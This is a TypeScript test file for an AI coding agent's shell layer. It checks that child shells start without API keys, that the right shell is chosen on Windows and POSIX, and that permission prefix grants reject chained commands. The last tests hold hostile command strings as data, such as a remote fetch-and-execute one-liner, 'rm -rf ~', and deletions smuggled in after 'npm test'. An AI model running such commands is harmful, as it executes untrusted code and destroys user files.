// What a child shell starts with, and which shell it is (the D2 shell
// package). The OpenAI key used to be written into this process's environment
// and every shell inherited it: the terminal's PTY and the agent's runShell
// alike, so a command the model wrote could print it. Children now start
// scrubbed. And the runner spawned /bin/bash on every platform, which stock
// Windows does not have: the shell is now resolved (Git for Windows' bash,
// else PowerShell), with a tree kill that works where there are no process
// groups.
import { afterEach, describe, expect, it } from 'vitest';
import { mkdtempSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import type { spawn } from 'node:child_process';
import { isSecretEnvName, scrubbedEnv } from '../src/core/exec/childEnv.js';
import { runCommand } from '../src/core/exec/commandRunner.js';
import {
  gitRootFromExecPath,
  killProcessTree,
  resolveShell,
  shellInfo,
} from '../src/core/exec/shell.js';
import { commandMatchesPrefix, isShellWrapper } from '../src/core/permissions/index.js';
import { TerminalManager, type PtySpawnOptions, type TerminalPty } from '../src/daemon/terminal.js';

const PLANTED = {
  OPENAI_API_KEY: 'sk-planted-openai',
  ANTHROPIC_API_KEY: 'sk-ant-planted',
  GITHUB_TOKEN: 'ghp_planted',
  MY_SERVICE_SECRET: 'planted-secret',
  AWS_SECRET_ACCESS_KEY: 'planted-aws',
};

afterEach(() => {
  for (const name of Object.keys(PLANTED)) delete process.env[name];
});

function fakePty(): TerminalPty {
  return { write() {}, resize() {}, kill() {}, onData() {}, onExit() {} };
}

describe('scrubbedEnv', () => {
  it('drops keys, tokens and secrets, and keeps what a shell needs', () => {
    const env = scrubbedEnv({
      ...PLANTED,
      PATH: '/usr/bin:/bin',
      HOME: '/home/me',
      LANG: 'en_US.UTF-8',
      TERM: 'xterm-256color',
      SSH_AUTH_SOCK: '/tmp/agent.sock',
      JAVA_HOME: '/opt/jdk',
      PGPASSWORD: 'planted-pg',
    });
    for (const name of [...Object.keys(PLANTED), 'PGPASSWORD']) {
      expect(env[name], name).toBeUndefined();
    }
    expect(env).toMatchObject({
      PATH: '/usr/bin:/bin',
      HOME: '/home/me',
      LANG: 'en_US.UTF-8',
      TERM: 'xterm-256color',
      SSH_AUTH_SOCK: '/tmp/agent.sock',
      JAVA_HOME: '/opt/jdk',
    });
  });

  it('names what it drops by convention, not by a list of providers', () => {
    for (const name of ['OPENAI_API_KEY', 'GROQ_APIKEY', 'HF_TOKEN', 'NPM_TOKEN', 'X_SECRET']) {
      expect(isSecretEnvName(name), name).toBe(true);
    }
    for (const name of ['PATH', 'TERM', 'SSH_AUTH_SOCK', 'KEYTIMEOUT', 'TOKENIZERS_PARALLELISM']) {
      expect(isSecretEnvName(name), name).toBe(false);
    }
  });

  it('passes a named variable through only when the caller keeps it', () => {
    expect(scrubbedEnv(PLANTED, ['ANTHROPIC_API_KEY'])).toEqual({
      ANTHROPIC_API_KEY: 'sk-ant-planted',
    });
  });
});

// The two real spawns read the environment through POSIX `env` and bash
// parameter expansion, so they run where the runner spawns bash.
const posix = process.platform !== 'win32';

describe('a spawned command carries no key', () => {
  it.skipIf(!posix)(
    "the runner's child environment has no *_API_KEY, *_TOKEN or *_SECRET",
    async () => {
      Object.assign(process.env, PLANTED);
      const dir = mkdtempSync(join(tmpdir(), 'osc-env-'));
      const result = await runCommand({ command: 'env', cwd: dir, stdin: 'ignore' }).done;
      rmSync(dir, { recursive: true, force: true });
      expect(result.exitCode).toBe(0);
      const names = result.stdout.split('\n').map((line) => line.split('=')[0]!);
      expect(names).toContain('PATH');
      expect(names.filter((n) => /_API_KEY$|_TOKEN$|_SECRET$|_ACCESS_KEY$/.test(n))).toEqual([]);
      for (const value of Object.values(PLANTED)) expect(result.stdout).not.toContain(value);
    },
  );

  it.skipIf(!posix)('a kept variable reaches the child, and only that one', async () => {
    // Plain values, so the runner's key redaction leaves the echo readable.
    Object.assign(process.env, PLANTED, { ANTHROPIC_API_KEY: 'kept', OPENAI_API_KEY: 'dropped' });
    const dir = mkdtempSync(join(tmpdir(), 'osc-env-'));
    const result = await runCommand({
      command: 'echo "a=${ANTHROPIC_API_KEY:-none} o=${OPENAI_API_KEY:-none}"',
      cwd: dir,
      stdin: 'ignore',
      keepEnv: ['ANTHROPIC_API_KEY'],
    }).done;
    rmSync(dir, { recursive: true, force: true });
    expect(result.stdout.trim()).toBe('a=kept o=none');
  });

  it("the terminal's PTY is spawned without the keys", async () => {
    const seen: PtySpawnOptions[] = [];
    const manager = new TerminalManager({
      platform: 'linux',
      env: { ...PLANTED, PATH: '/usr/bin', HOME: '/home/me', TERM: 'xterm' },
      spawn: async (opts) => {
        seen.push(opts);
        return fakePty();
      },
    });
    await manager.ensure({ sessionId: 's1', cwd: '/tmp' });
    expect(seen).toHaveLength(1);
    const env = seen[0]!.env;
    for (const name of Object.keys(PLANTED)) expect(env[name], name).toBeUndefined();
    expect(env).toMatchObject({ PATH: '/usr/bin', HOME: '/home/me', TERM: 'xterm' });
  });
});

describe('TerminalManager.killAll', () => {
  it('ends every shell in every scope, and nothing is left to reach', async () => {
    const killed: number[] = [];
    let n = 0;
    const manager = new TerminalManager({
      spawn: async () => {
        const id = n++;
        return { ...fakePty(), kill: () => killed.push(id) };
      },
    });
    const a = await manager.ensure({ sessionId: 's1', cwd: '/tmp' });
    const b = await manager.ensure({ sessionId: 's2', cwd: '/tmp' });
    const c = await manager.ensure({ sessionId: 'home', cwd: '/tmp' });
    expect(manager.killAll()).toBe(3);
    expect(killed.sort()).toEqual([0, 1, 2]);
    for (const { termId } of [a, b, c]) expect(manager.has(termId)).toBe(false);
    expect(manager.liveTermId('s1')).toBeUndefined();
    expect(manager.killAll()).toBe(0);
  });
});

describe('resolveShell', () => {
  const windowsEnv = {
    ProgramFiles: 'C:\\Program Files',
    LOCALAPPDATA: 'C:\\Users\\me\\AppData\\Local',
    PATH: 'C:\\Windows\\System32',
  };

  it('Linux and macOS run /bin/bash -c, as before, without probing', () => {
    const probed: string[] = [];
    for (const platform of ['linux', 'darwin'] as const) {
      const shell = resolveShell({ platform, probe: (c) => (probed.push(c), false) });
      expect(shell.file).toBe('/bin/bash');
      expect(shell.args('ls')).toEqual(['-c', 'ls']);
    }
    expect(probed).toEqual([]);
  });

  it('Windows with no bash picks PowerShell 7, then Windows PowerShell', () => {
    const none = () => undefined;
    const pwsh = resolveShell({
      platform: 'win32',
      env: windowsEnv,
      gitExecPath: none,
      probe: (c) => c === 'pwsh',
    });
    expect(pwsh).toMatchObject({ kind: 'powershell', file: 'pwsh' });
    expect(pwsh.args('dir')).toEqual(['-NoProfile', '-Command', 'dir']);
    const stock = resolveShell({
      platform: 'win32',
      env: windowsEnv,
      gitExecPath: none,
      probe: () => false,
    });
    expect(stock).toMatchObject({ kind: 'powershell', file: 'powershell.exe' });
    expect(stock.args('dir')).toEqual(['-NoProfile', '-Command', 'dir']);
  });

  it("Windows prefers Git for Windows' bash, and never System32's WSL launcher", () => {
    const probed: string[] = [];
    const git = resolveShell({
      platform: 'win32',
      env: windowsEnv,
      gitExecPath: () => undefined,
      probe: (c) => {
        probed.push(c);
        return c.endsWith('Git\\bin\\bash.exe');
      },
    });
    expect(git.kind).toBe('bash');
    expect(git.file).toBe('C:\\Program Files\\Git\\bin\\bash.exe');
    expect(git.args('ls')).toEqual(['-c', 'ls']);
    expect(probed.some((c) => /system32/i.test(c) || c === 'bash')).toBe(false);
  });

  it('finds Git Bash beside the git on PATH through git --exec-path', () => {
    expect(gitRootFromExecPath('C:/Tools/Git/mingw64/libexec/git-core\n')).toBe('C:\\Tools\\Git');
    expect(gitRootFromExecPath('/usr/lib/git-core')).toBeUndefined();
    const shell = resolveShell({
      platform: 'win32',
      env: windowsEnv,
      gitExecPath: () => 'C:\\Tools\\Git\\mingw64\\libexec\\git-core',
      probe: (c) => c === 'C:\\Tools\\Git\\bin\\bash.exe',
    });
    expect(shell).toMatchObject({ kind: 'bash', file: 'C:\\Tools\\Git\\bin\\bash.exe' });
  });
});

describe('killProcessTree', () => {
  it('Windows ends the whole tree with taskkill /T /F', () => {
    const calls: Array<{ cmd: string; args: readonly string[] }> = [];
    const fakeSpawn = ((cmd: string, args: readonly string[]) => {
      calls.push({ cmd, args });
      return { on: () => undefined };
    }) as unknown as typeof spawn;
    killProcessTree(4321, 'SIGTERM', 'win32', fakeSpawn);
    killProcessTree(4321, 'SIGKILL', 'win32', fakeSpawn);
    expect(calls).toEqual([
      { cmd: 'taskkill', args: ['/pid', '4321', '/T', '/F'] },
      { cmd: 'taskkill', args: ['/pid', '4321', '/T', '/F'] },
    ]);
  });

  it('POSIX signals the process group and never spawns a helper', () => {
    const fakeSpawn = (() => {
      throw new Error('no helper on POSIX');
    }) as unknown as typeof spawn;
    // A pid that is not a group leader here: the signal fails quietly.
    expect(() => killProcessTree(2 ** 22 + 7, 'SIGTERM', 'linux', fakeSpawn)).not.toThrow();
  });
});

describe('shellInfo: one answer for the prompt, the runner and the permission engine', () => {
  it('names the platform and the shell a command runs in', () => {
    expect(shellInfo({ platform: 'linux' })).toEqual({ platform: 'linux', shell: 'bash' });
    expect(
      shellInfo({ platform: 'win32', env: {}, gitExecPath: () => undefined, probe: () => false }),
    ).toEqual({ platform: 'win32', shell: 'powershell' });
    // With no options it is this computer's answer.
    expect(shellInfo().platform).toBe(process.platform);
  });
});

describe('prefix grants and the shell (CTO ruling 10)', () => {
  it('under PowerShell no prefix grant matches, so every command asks', () => {
    expect(commandMatchesPrefix('npm test', 'npm', 'bash')).toBe(true);
    expect(commandMatchesPrefix('npm test', 'npm', 'powershell')).toBe(false);
    expect(commandMatchesPrefix('npm test; & { Remove-Item x }', 'npm', 'powershell')).toBe(false);
  });

  it("PowerShell's evaluators and the shells are wrappers, by any spelling that runs them", () => {
    for (const word of [
      'iex',
      'IEX',
      'Invoke-Expression',
      'invoke-expression',
      'pwsh',
      'pwsh.exe',
    ]) {
      expect(isShellWrapper(word), word).toBe(true);
    }
    for (const word of [
      'powershell',
      'PowerShell.exe',
      'cmd',
      'CMD.EXE',
      'C:\\Windows\\System32\\cmd.exe',
    ]) {
      expect(isShellWrapper(word), word).toBe(true);
    }
    for (const word of ['Bash', '/bin/sh', '/usr/bin/env'])
      expect(isShellWrapper(word), word).toBe(true);
    for (const word of ['npm', 'git', 'pytest', 'cmake'])
      expect(isShellWrapper(word), word).toBe(false);
    expect(commandMatchesPrefix('iex (irm example.com)', 'iex', 'bash')).toBe(false);
    expect(commandMatchesPrefix('npm test && cmd /c del x', 'npm', 'bash')).toBe(false);
    expect(commandMatchesPrefix('/bin/sh -c "rm -rf ~"', '/bin/sh', 'bash')).toBe(false);
  });
});
